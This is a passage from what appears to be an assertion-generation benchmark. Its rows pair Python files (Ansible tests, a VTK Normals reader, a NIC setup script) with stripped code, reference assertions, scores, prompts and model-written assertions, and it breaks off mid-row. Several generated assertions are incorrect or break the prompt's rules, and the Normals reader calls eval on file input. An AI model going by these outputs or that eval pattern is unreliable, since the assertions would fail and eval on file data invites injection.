45fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
46fixture_data = {}
47
48
49def load_fixture(name):
50    path = os.path.join(fixture_path, name)
51
52    if path in fixture_data:
53        return fixture_data[path]
54
55    with open(path) as f:
56        data = f.read()
57
58    try:
59        data = json.loads(data)
60    except Exception:
61        pass
62
63    fixture_data[path] = data
64    return data
65
66
67class TestParameters(unittest.TestCase):
68    def test_module_parameters(self):
69        args = dict(
70            name='foo',
71            parent='bar',
72            maximum_size=100,
73            maximum_age=200,
74            maximum_reuse=300,
75            idle_timeout_override=20,
76            limit_type='strict'
77        )
78
79        p = ModuleParameters(params=args)
80
81    def test_api_parameters(self):
82        args = load_fixture('load_ltm_profile_oneconnect_1.json')
83        p = ApiParameters(params=args)
84
85
86class TestManager(unittest.TestCase):
87
88    def setUp(self):
89        self.spec = ArgumentSpec()
90
91    def test_create(self, *args):
92        # Configure the arguments that would be sent to the Ansible module
93        set_module_args(dict(
94            name='foo',
95            parent='bar',
96            maximum_reuse=1000,
97            provider=dict(
98                server='localhost',
99                password='password',
100                user='admin'
101            )
102        ))
103
104        module = AnsibleModule(
105            argument_spec=self.spec.argument_spec,
106            supports_check_mode=self.spec.supports_check_mode
107        )
108        mm = ModuleManager(module=module)
109
110        # Override methods to force specific logic in the module to happen
111        mm.exists = Mock(return_value=False)
112        mm.create_on_device = Mock(return_value=True)
113
114        results = mm.exec_module()
115
116","[['p.name', '==', ""'foo'""], ['p.parent', '==', ""'/Common/bar'""], ['p.maximum_size', '==', '100'], ['p.maximum_age', '==', '200'], ['p.maximum_reuse', '==', '300'], ['p.idle_timeout_override', '==', '20'], ['p.limit_type', '==', ""'strict'""], ['p.name', '==', ""'oneconnect'""], ['p.maximum_reuse', '==', '1000'], [""results['changed']"", '==', 'True'], [""results['maximum_reuse']"", '==', '1000']]",11,11,1.0,0.0029255319148936,"['__metaclass__', 'pytestmark', 'fixture_path', 'fixture_data', 'name', 'path', 'data', 'fixture_data[path]', 'args', 'p', 'self.spec', '*args', 'module', 'mm', 'mm.exists', 'mm.create_on_device', 'results']",17,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__metaclass__', 'pytestmark', 'fixture_path', 'fixture_data', 'name', 'path', 'data', 'fixture_data[path]', 'args', 'p', 'self.spec', '*args', 'module', 'mm', 'mm.exists', 'mm.create_on_device', 'results']
*Code:

1# -*- coding: utf-8 -*-
2#
3# Copyright: (c) 2017, F5 Networks Inc.
4# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
5
6from __future__ import (absolute_import, division, print_function)
7__metaclass__ = type
8
9import os
10import json
11import pytest
12import sys
13
14if sys.version_info < (2, 7):
15    pytestmark = pytest.mark.skip(""F5 Ansible modules require Python >= 2.7"")
16
17from ansible.module_utils.basic import AnsibleModule
18
19try:
20    from library.modules.bigip_profile_oneconnect import ApiParameters
21    from library.modules.bigip_profile_oneconnect import ModuleParameters
22    from library.modules.bigip_profile_oneconnect import ModuleManager
23    from library.modules.bigip_profile_oneconnect import ArgumentSpec
24
25    # In Ansible 2.8, Ansible changed import paths.
26    from test.units.compat import unittest
27    from test.units.compat.mock import Mock
28    from test.units.compat.mock import patch
29
30    from test.units.modules.utils import set_module_args
31except ImportError:
32    from ansible.modules.network.f5.bigip_profile_oneconnect import ApiParameters
33    from ansible.modules.network.f5.bigip_profile_oneconnect import ModuleParameters
34    from ansible.modules.network.f5.bigip_profile_oneconnect import ModuleManager
35    from ansible.modules.network.f5.bigip_profile_oneconnect import ArgumentSpec
36
37    # Ansible 2.8 imports
38    from units.compat import unittest
39    from units.compat.mock import Mock
40    from units.compat.mock import patch
41
42    from units.modules.utils import set_module_args
43
44
45fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
46fixture_data = {}
47
48
49def load_fixture(name):
50    path = os.path.join(fixture_path, name)
51
52    if path in fixture_data:
53        return fixture_data[path]
54
55    with open(path) as f:
56        data = f.read()
57
58    try:
59        data = json.loads(data)
60    except Exception:
61        pass
62
63    fixture_data[path] = data
64    return data
65
66
67class TestParameters(unittest.TestCase):
68    def test_module_parameters(self):
69        args = dict(
70            name='foo',
71            parent='bar',
72            maximum_size=100,
73            maximum_age=200,
74            maximum_reuse=300,
75            idle_timeout_override=20,
76            limit_type='strict'
77        )
78
79        p = ModuleParameters(params=args)
80
81    def test_api_parameters(self):
82        args = load_fixture('load_ltm_profile_oneconnect_1.json')
83        p = ApiParameters(params=args)
84
85
86class TestManager(unittest.TestCase):
87
88    def setUp(self):
89        self.spec = ArgumentSpec()
90
91    def test_create(self, *args):
92        # Configure the arguments that would be sent to the Ansible module
93        set_module_args(dict(
94            name='foo',
95            parent='bar',
96            maximum_reuse=1000,
97            provider=dict(
98                server='localhost',
99                password='password',
100                user='admin'
101            )
102        ))
103
104        module = AnsibleModule(
105            argument_spec=self.spec.argument_spec,
106            supports_check_mode=self.spec.supports_check_mode
107        )
108        mm = ModuleManager(module=module)
109
110        # Override methods to force specific logic in the module to happen
111        mm.exists = Mock(return_value=False)
112        mm.create_on_device = Mock(return_value=True)
113
114        results = mm.exec_module()
115
116",5153,"[[14, 'sys.version_info', '>=', (2, 7), ""F5 Ansible modules require Python >= 2.7""],
[82, 'args', '!=', None, ""args should not be None for API parameters""],
[82, 'path', '!=', None, ""path should exist""],
[93, 'dict', '!=', None, ""Dictionary for module arguments should not be None""],
[102, 'module', '!=', None, ""module should not be None for Module Manager""],
[107, 'mm.exists', '==', False, ""Module should not exist before creation""],
[107, 'mm.create_on_device', '==', True, ""Creating a device should return True""],
[114, 'results', '!=', None, ""Results from execution should not be None""]]"
palmerjh/iEBE,"#!/usr/bin/env python
""""""
Normals
""""""
""""""

Copyright 2001 Pearu Peterson all rights reserved,
Pearu Peterson <pearu@ioc.ee>          
Permission to use, modify, and distribute this software is given under the
terms of the LGPL.  See http://www.fsf.org

NO WARRANTY IS EXPRESSED OR IMPLIED.  USE AT YOUR OWN RISK.
$Revision: 1.3 $
$Date: 2001-05-31 17:48:54 $
Pearu Peterson
""""""

import DataSetAttr
import math
import common

class Normals(DataSetAttr.DataSetAttr):
    """"""Holds VTK Normals.
    Usage:
      Normals(<sequence of 3-tuples> ,name = <string>)
    Attributes:
      normals
      name
    Public methods:
      get_size()
      to_string(format = 'ascii')
    """"""
    def __init__(self,normals,name=None):
        self.name = self._get_name(name)
        seq = []
        for v in self.get_3_tuple_list(normals,(self.default_value,)*3):
            n = math.sqrt(v[0]*v[0]+v[1]*v[1]+v[2]*v[2])
            if n==0:
                self.warning('cannot normalize zero vector')
                seq.append(v)
            elif n==1:
                seq.append(v)
            else:
                seq.append(tuple([c/n for c in v]))
        self.normals = seq
    def to_string(self,format='ascii'):
        t = self.get_datatype(self.normals)
        ret = ['NORMALS %s %s'%(self.name,t),
               self.seq_to_string(self.normals,format,t)]
        return '\n'.join(ret)
    def get_size(self):
        return len(self.normals)

def normals_fromfile(f,n,sl):
    dataname = sl[0]
    datatype = sl[1].lower()
    assert datatype in ['bit','unsigned_char','char','unsigned_short','short','unsigned_int','int','unsigned_long','long','float','double'],`datatype`
    normals = []
    while len(normals) < 3*n:
        normals += map(eval,common._getline(f).split(' '))
    assert len(normals) == 3*n
    return Normals(normals,dataname)

if __name__ == ""__main__"":
    print Normals([[3,3],[4,3.],240,3,2]).to_string()
","
1#!/usr/bin/env python
2""""""
3Normals
4""""""
5""""""
6
7Copyright 2001 Pearu Peterson all rights reserved,
8Pearu Peterson <pearu@ioc.ee>          
9Permission to use, modify, and distribute this software is given under the
10terms of the LGPL.  See http://www.fsf.org
11
12NO WARRANTY IS EXPRESSED OR IMPLIED.  USE AT YOUR OWN RISK.
13$Revision: 1.3 $
14$Date: 2001-05-31 17:48:54 $
15Pearu Peterson
16""""""
17
18import DataSetAttr
19import math
20import common
21
22class Normals(DataSetAttr.DataSetAttr):
23    """"""Holds VTK Normals.
24    Usage:
25      Normals(<sequence of 3-tuples> ,name = <string>)
26    Attributes:
27      normals
28      name
29    Public methods:
30      get_size()
31      to_string(format = 'ascii')
32    """"""
33    def __init__(self,normals,name=None):
34        self.name = self._get_name(name)
35        seq = []
36        for v in self.get_3_tuple_list(normals,(self.default_value,)*3):
37            n = math.sqrt(v[0]*v[0]+v[1]*v[1]+v[2]*v[2])
38            if n==0:
39                self.warning('cannot normalize zero vector')
40                seq.append(v)
41            elif n==1:
42                seq.append(v)
43            else:
44                seq.append(tuple([c/n for c in v]))
45        self.normals = seq
46    def to_string(self,format='ascii'):
47        t = self.get_datatype(self.normals)
48        ret = ['NORMALS %s %s'%(self.name,t),
49               self.seq_to_string(self.normals,format,t)]
50        return '\n'.join(ret)
51    def get_size(self):
52        return len(self.normals)
53
54def normals_fromfile(f,n,sl):
55    dataname = sl[0]
56    datatype = sl[1].lower()
57    normals = []
58    while len(normals) < 3*n:
59        normals += map(eval,common._getline(f).split(' '))
60    return Normals(normals,dataname)
61
62if __name__ == ""__main__"":
63    print Normals([[3,3],[4,3.],240,3,2]).to_string()
64","[['len(normals)', '==', '3*n']]",2,1,0.5,0.0005175983436853,"['Normals(<sequence of 3-tuples>', 'name', 'to_string(format', 'normals', 'self.name', 'seq', 'n', 'self.normals', 'format', 't', 'ret', 'f', 'sl', 'dataname', 'datatype']",15,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['Normals(<sequence of 3-tuples>', 'name', 'to_string(format', 'normals', 'self.name', 'seq', 'n', 'self.normals', 'format', 't', 'ret', 'f', 'sl', 'dataname', 'datatype']
*Code:

1#!/usr/bin/env python
2""""""
3Normals
4""""""
5""""""
6
7Copyright 2001 Pearu Peterson all rights reserved,
8Pearu Peterson <pearu@ioc.ee>          
9Permission to use, modify, and distribute this software is given under the
10terms of the LGPL.  See http://www.fsf.org
11
12NO WARRANTY IS EXPRESSED OR IMPLIED.  USE AT YOUR OWN RISK.
13$Revision: 1.3 $
14$Date: 2001-05-31 17:48:54 $
15Pearu Peterson
16""""""
17
18import DataSetAttr
19import math
20import common
21
22class Normals(DataSetAttr.DataSetAttr):
23    """"""Holds VTK Normals.
24    Usage:
25      Normals(<sequence of 3-tuples> ,name = <string>)
26    Attributes:
27      normals
28      name
29    Public methods:
30      get_size()
31      to_string(format = 'ascii')
32    """"""
33    def __init__(self,normals,name=None):
34        self.name = self._get_name(name)
35        seq = []
36        for v in self.get_3_tuple_list(normals,(self.default_value,)*3):
37            n = math.sqrt(v[0]*v[0]+v[1]*v[1]+v[2]*v[2])
38            if n==0:
39                self.warning('cannot normalize zero vector')
40                seq.append(v)
41            elif n==1:
42                seq.append(v)
43            else:
44                seq.append(tuple([c/n for c in v]))
45        self.normals = seq
46    def to_string(self,format='ascii'):
47        t = self.get_datatype(self.normals)
48        ret = ['NORMALS %s %s'%(self.name,t),
49               self.seq_to_string(self.normals,format,t)]
50        return '\n'.join(ret)
51    def get_size(self):
52        return len(self.normals)
53
54def normals_fromfile(f,n,sl):
55    dataname = sl[0]
56    datatype = sl[1].lower()
57    normals = []
58    while len(normals) < 3*n:
59        normals += map(eval,common._getline(f).split(' '))
60    return Normals(normals,dataname)
61
62if __name__ == ""__main__"":
63    print Normals([[3,3],[4,3.],240,3,2]).to_string()
64",3421,"[[33, 'normals', '!=', None, ""Function initialization requires 'normals' as input""],
 [33, 'name', '!=', None, ""Function initialization can use 'name' as optional input""],
 [52, 'self.normals', '>=', 1, ""Output size of the 'normals' should be greater than or equal to 1""],
 [54, 'f', '!=', None, ""Function 'normals_fromfile' requires 'f' as input""],
 [54, 'n', '!=', None, ""Function 'normals_fromfile' requires 'n' as input""],
 [54, 'sl', '!=', None, ""Function 'normals_fromfile' requires 'sl' as input""],
 [58, 'normals', '>=', 3*n, ""Output size of the 'normals' should be 3 times of input 'n'""]]"
GoogleCloudPlatform/fourkeys,"# Copyright 2020 Google, LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import base64
import json

import main
import shared

from cloudevents.http import CloudEvent, to_structured

import mock
import pytest


@pytest.fixture
def client():
    main.app.testing = True
    return main.app.test_client()


def test_not_json(client):
    with pytest.raises(Exception) as e:
        client.post(""/"", data=""foo"")

    assert ""Expecting JSON payload"" in str(e.value)


def test_not_pubsub_message(client):
    with pytest.raises(Exception) as e:
        client.post(
            ""/"",
            data=json.dumps({""foo"": ""bar""}),
            headers={""Content-Type"": ""application/json""},
        )

    assert ""Not a valid Pub/Sub Message"" in str(e.value)


def test_missing_msg_attributes(client):
    with pytest.raises(Exception) as e:
        client.post(
            ""/"",
            data=json.dumps({""message"": ""bar""}),
            headers={""Content-Type"": ""application/json""},
        )

    assert ""Missing pubsub attributes"" in str(e.value)


def test_tekton_source_event_processed(client):
    attributes = {
        ""type"": ""tekton.foo"",
        ""source"": ""https://example.com/event-producer"",
        ""time"": 0,
        ""id"": ""bar""
    }
    data = {""pipelineRun"": {""metadata"": {""uid"": ""foo""}}}
    event = CloudEvent(attributes, data)

    # Creates the HTTP request representation of the CloudEvent in structured content mode
    headers, body = to_structured(event)

    pubsub_msg = {
        ""message"": {
            ""data"": base64.b64encode(body).decode(""utf-8""),
            ""attributes"": {""headers"": json.dumps(headers)},
            ""message_id"": ""foobar"",
        },
    }

    event = {
        ""event_type"": ""tekton.foo"",
        ""id"": ""foo"",
        ""metadata"": body.decode(),
        ""time_created"": 0,
        ""signature"": ""bar"",
        ""msg_id"": ""foobar"",
        ""source"": ""tekton"",
    }

    shared.insert_row_into_bigquery = mock.MagicMock()

    r = client.post(
        ""/"",
        data=json.dumps(pubsub_msg),
        headers={""Content-Type"": ""application/json""},
    )

    shared.insert_row_into_bigquery.assert_called_with(event)
    assert r.status_code == 204
","
1# Copyright 2020 Google, LLC.
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#    http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14
15import base64
16import json
17
18import main
19import shared
20
21from cloudevents.http import CloudEvent, to_structured
22
23import mock
24import pytest
25
26
27@pytest.fixture
28def client():
29    main.app.testing = True
30    return main.app.test_client()
31
32
33def test_not_json(client):
34    with pytest.raises(Exception) as e:
35        client.post(""/"", data=""foo"")
36
37
38
39def test_not_pubsub_message(client):
40    with pytest.raises(Exception) as e:
41        client.post(
42            ""/"",
43            data=json.dumps({""foo"": ""bar""}),
44            headers={""Content-Type"": ""application/json""},
45        )
46
47
48
49def test_missing_msg_attributes(client):
50    with pytest.raises(Exception) as e:
51        client.post(
52            ""/"",
53            data=json.dumps({""message"": ""bar""}),
54            headers={""Content-Type"": ""application/json""},
55        )
56
57
58
59def test_tekton_source_event_processed(client):
60    attributes = {
61        ""type"": ""tekton.foo"",
62        ""source"": ""https://example.com/event-producer"",
63        ""time"": 0,
64        ""id"": ""bar""
65    }
66    data = {""pipelineRun"": {""metadata"": {""uid"": ""foo""}}}
67    event = CloudEvent(attributes, data)
68
69    # Creates the HTTP request representation of the CloudEvent in structured content mode
70    headers, body = to_structured(event)
71
72    pubsub_msg = {
73        ""message"": {
74            ""data"": base64.b64encode(body).decode(""utf-8""),
75            ""attributes"": {""headers"": json.dumps(headers)},
76            ""message_id"": ""foobar"",
77        },
78    }
79
80    event = {
81        ""event_type"": ""tekton.foo"",
82        ""id"": ""foo"",
83        ""metadata"": body.decode(),
84        ""time_created"": 0,
85        ""signature"": ""bar"",
86        ""msg_id"": ""foobar"",
87        ""source"": ""tekton"",
88    }
89
90    shared.insert_row_into_bigquery = mock.MagicMock()
91
92    r = client.post(
93        ""/"",
94        data=json.dumps(pubsub_msg),
95        headers={""Content-Type"": ""application/json""},
96    )
97
98","[['r.status_code', '==', '204']]",5,1,0.2,0.0003705075954057,"['main.app.testing', 'client', 'attributes', 'data', 'event', 'headers', 'body', 'pubsub_msg', 'shared.insert_row_into_bigquery', 'r']",10,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['main.app.testing', 'client', 'attributes', 'data', 'event', 'headers', 'body', 'pubsub_msg', 'shared.insert_row_into_bigquery', 'r']
*Code:

1# Copyright 2020 Google, LLC.
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#    http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14
15import base64
16import json
17
18import main
19import shared
20
21from cloudevents.http import CloudEvent, to_structured
22
23import mock
24import pytest
25
26
27@pytest.fixture
28def client():
29    main.app.testing = True
30    return main.app.test_client()
31
32
33def test_not_json(client):
34    with pytest.raises(Exception) as e:
35        client.post(""/"", data=""foo"")
36
37
38
39def test_not_pubsub_message(client):
40    with pytest.raises(Exception) as e:
41        client.post(
42            ""/"",
43            data=json.dumps({""foo"": ""bar""}),
44            headers={""Content-Type"": ""application/json""},
45        )
46
47
48
49def test_missing_msg_attributes(client):
50    with pytest.raises(Exception) as e:
51        client.post(
52            ""/"",
53            data=json.dumps({""message"": ""bar""}),
54            headers={""Content-Type"": ""application/json""},
55        )
56
57
58
59def test_tekton_source_event_processed(client):
60    attributes = {
61        ""type"": ""tekton.foo"",
62        ""source"": ""https://example.com/event-producer"",
63        ""time"": 0,
64        ""id"": ""bar""
65    }
66    data = {""pipelineRun"": {""metadata"": {""uid"": ""foo""}}}
67    event = CloudEvent(attributes, data)
68
69    # Creates the HTTP request representation of the CloudEvent in structured content mode
70    headers, body = to_structured(event)
71
72    pubsub_msg = {
73        ""message"": {
74            ""data"": base64.b64encode(body).decode(""utf-8""),
75            ""attributes"": {""headers"": json.dumps(headers)},
76            ""message_id"": ""foobar"",
77        },
78    }
79
80    event = {
81        ""event_type"": ""tekton.foo"",
82        ""id"": ""foo"",
83        ""metadata"": body.decode(),
84        ""time_created"": 0,
85        ""signature"": ""bar"",
86        ""msg_id"": ""foobar"",
87        ""source"": ""tekton"",
88    }
89
90    shared.insert_row_into_bigquery = mock.MagicMock()
91
92    r = client.post(
93        ""/"",
94        data=json.dumps(pubsub_msg),
95        headers={""Content-Type"": ""application/json""},
96    )
97
98",4143,"[[28, 'client', '!=', None, ""client object must be initialized before further processing""],
 [60, 'attributes', '!=', None, ""Attributes object must be initialized""],
 [66, 'data', '!=', None, ""Data object must be initialized""],
 [67, 'event', '!=', None, ""Event object must be initialized""],
 [72, 'pubsub_msg', '!=', None, ""pubsub_msg object must be initialized""],
 [90, 'shared.insert_row_into_bigquery', '!=', None, 
     ""insert_row_into_bigquery method should be defined""],
 [92, 'r', '!=', None, ""Response object must be defined""]]"
yayuntian/ioengine_10g,"#!/usr/bin/env python

import sys
import os
import subprocess
import time

ITR = 956	# interrupt throttling rate

def execute(cmd):
	try:
		proc = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE)
		return proc.communicate()[0]
	except:
		pass
		return None
	
def get_num_interfaces():
	output_82598 = execute('lspci | grep 82598').strip()
	num_82598 = len(output_82598.split('\n'))
	if output_82598 == '':
		num_82598 = 0

	output_82599 = execute('lspci | grep 82599').strip()
	num_82599 = len(output_82599.split('\n'))
	if output_82599 == '':
		num_82599 = 0
	
	return num_82598 + num_82599

def get_num_cpus():
	output = execute('cat /proc/cpuinfo | grep processor')
	return len(output.strip().split('\n'))
	
if os.getuid() != 0:
	print 'You must be root!'
	sys.exit(1)

if len(sys.argv) < 3:
	print 'usage: %s <# of RX queues> <# of TX queues>' % sys.argv[0]
	sys.exit(1)

num_rx_queues = int(sys.argv[1])
num_tx_queues = int(sys.argv[2])
postfix = '1'

assert 0 <= num_rx_queues <= 16

num_ifs = get_num_interfaces()
num_cpus = get_num_cpus()

execute('rmmod ps_ixgbe &> /dev/null')
execute('insmod ./ps_ixgbe.ko RXQ=%s TXQ=%s InterruptThrottleRate=%s' % 
		(','.join([str(num_rx_queues)] * num_ifs),
		 ','.join([str(num_tx_queues)] * num_ifs),
		 ','.join([str(ITR)] * num_ifs))
	)

time.sleep(3)

print 'number of ifs : %d, number of rx queues: %d, number of tx queues: %d' % (num_ifs, num_rx_queues, num_tx_queues)

for i in range(num_ifs):
	ifname = 'eth%d' % (i+2)
	print 'setting %s...' % ifname,
	
	execute('ethtool -A %s autoneg off rx off tx off' % ifname)
	execute('ifconfig %s 10.0.%d.%s netmask 255.255.255.0' % (ifname, i, postfix))

	print 'OK'
	print execute('./affinity.py %s' % ifname).strip()

execute('rm -f /dev/packet_shader')
execute('mknod /dev/packet_shader c 1010 0')
execute('chmod 666 /dev/packet_shader')
","
1#!/usr/bin/env python
2
3import sys
4import os
5import subprocess
6import time
7
8ITR = 956	# interrupt throttling rate
9
10def execute(cmd):
11	try:
12		proc = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE)
13		return proc.communicate()[0]
14	except:
15		pass
16		return None
17	
18def get_num_interfaces():
19	output_82598 = execute('lspci | grep 82598').strip()
20	num_82598 = len(output_82598.split('\n'))
21	if output_82598 == '':
22		num_82598 = 0
23
24	output_82599 = execute('lspci | grep 82599').strip()
25	num_82599 = len(output_82599.split('\n'))
26	if output_82599 == '':
27		num_82599 = 0
28	
29	return num_82598 + num_82599
30
31def get_num_cpus():
32	output = execute('cat /proc/cpuinfo | grep processor')
33	return len(output.strip().split('\n'))
34	
35if os.getuid() != 0:
36	print 'You must be root!'
37	sys.exit(1)
38
39if len(sys.argv) < 3:
40	print 'usage: %s <# of RX queues> <# of TX queues>' % sys.argv[0]
41	sys.exit(1)
42
43num_rx_queues = int(sys.argv[1])
44num_tx_queues = int(sys.argv[2])
45postfix = '1'
46
47
48num_ifs = get_num_interfaces()
49num_cpus = get_num_cpus()
50
51execute('rmmod ps_ixgbe &> /dev/null')
52execute('insmod ./ps_ixgbe.ko RXQ=%s TXQ=%s InterruptThrottleRate=%s' % 
53		(','.join([str(num_rx_queues)] * num_ifs),
54		 ','.join([str(num_tx_queues)] * num_ifs),
55		 ','.join([str(ITR)] * num_ifs))
56	)
57
58time.sleep(3)
59
60print 'number of ifs : %d, number of rx queues: %d, number of tx queues: %d' % (num_ifs, num_rx_queues, num_tx_queues)
61
62for i in range(num_ifs):
63	ifname = 'eth%d' % (i+2)
64	print 'setting %s...' % ifname,
65	
66	execute('ethtool -A %s autoneg off rx off tx off' % ifname)
67	execute('ifconfig %s 10.0.%d.%s netmask 255.255.255.0' % (ifname, i, postfix))
68
69	print 'OK'
70	print execute('./affinity.py %s' % ifname).strip()
71
72execute('rm -f /dev/packet_shader')
73execute('mknod /dev/packet_shader c 1010 0')
74execute('chmod 666 /dev/packet_shader')
75","[['0', '<=', 'num_rx_queues <= 16']]",1,1,1.0,0.0005402485143165,"['ITR', 'cmd', 'proc', 'output_82598', 'num_82598', 'output_82599', 'num_82599', 'output', 'num_rx_queues', 'num_tx_queues', 'postfix', 'num_ifs', 'num_cpus', 'ifname']",14,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['ITR', 'cmd', 'proc', 'output_82598', 'num_82598', 'output_82599', 'num_82599', 'output', 'num_rx_queues', 'num_tx_queues', 'postfix', 'num_ifs', 'num_cpus', 'ifname']
*Code:

1#!/usr/bin/env python
2
3import sys
4import os
5import subprocess
6import time
7
8ITR = 956	# interrupt throttling rate
9
10def execute(cmd):
11	try:
12		proc = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE)
13		return proc.communicate()[0]
14	except:
15		pass
16		return None
17	
18def get_num_interfaces():
19	output_82598 = execute('lspci | grep 82598').strip()
20	num_82598 = len(output_82598.split('\n'))
21	if output_82598 == '':
22		num_82598 = 0
23
24	output_82599 = execute('lspci | grep 82599').strip()
25	num_82599 = len(output_82599.split('\n'))
26	if output_82599 == '':
27		num_82599 = 0
28	
29	return num_82598 + num_82599
30
31def get_num_cpus():
32	output = execute('cat /proc/cpuinfo | grep processor')
33	return len(output.strip().split('\n'))
34	
35if os.getuid() != 0:
36	print 'You must be root!'
37	sys.exit(1)
38
39if len(sys.argv) < 3:
40	print 'usage: %s <# of RX queues> <# of TX queues>' % sys.argv[0]
41	sys.exit(1)
42
43num_rx_queues = int(sys.argv[1])
44num_tx_queues = int(sys.argv[2])
45postfix = '1'
46
47
48num_ifs = get_num_interfaces()
49num_cpus = get_num_cpus()
50
51execute('rmmod ps_ixgbe &> /dev/null')
52execute('insmod ./ps_ixgbe.ko RXQ=%s TXQ=%s InterruptThrottleRate=%s' % 
53		(','.join([str(num_rx_queues)] * num_ifs),
54		 ','.join([str(num_tx_queues)] * num_ifs),
55		 ','.join([str(ITR)] * num_ifs))
56	)
57
58time.sleep(3)
59
60print 'number of ifs : %d, number of rx queues: %d, number of tx queues: %d' % (num_ifs, num_rx_queues, num_tx_queues)
61
62for i in range(num_ifs):
63	ifname = 'eth%d' % (i+2)
64	print 'setting %s...' % ifname,
65	
66	execute('ethtool -A %s autoneg off rx off tx off' % ifname)
67	execute('ifconfig %s 10.0.%d.%s netmask 255.255.255.0' % (ifname, i, postfix))
68
69	print 'OK'
70	print execute('./affinity.py %s' % ifname).strip()
71
72execute('rm -f /dev/packet_shader')
73execute('mknod /dev/packet_shader c 1010 0')
74execute('chmod 666 /dev/packet_shader')
75",3509,"[[10, 'cmd', '!=', '', 'the command to execute must not be empty'],
